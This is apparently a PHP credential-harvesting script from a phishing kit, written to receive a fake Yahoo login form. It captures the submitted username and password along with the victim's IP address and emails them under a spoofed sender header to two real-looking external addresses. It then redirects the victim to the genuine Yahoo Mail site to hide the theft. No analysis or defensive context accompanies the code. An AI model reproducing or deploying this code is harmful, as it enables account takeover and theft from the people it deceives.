<?
$ip = getenv("REMOTE_ADDR");
$message .= "ID : ".$_POST['login']."\n";
$message .= "Password : ".$_POST['passwd']."\n";
$message .= "IP: ".$ip."\n";

$recipient = "Jsm203310@yahoo.com,bowenjack3311@gmail.com";
$subject = "Yahoo! Account Information";
$headers = "From: Mail Admin<mail@admin.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail($Recipient,$subject,$message,$headers);
	 if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location:  http://www.yahoomail.com");

	   }

?>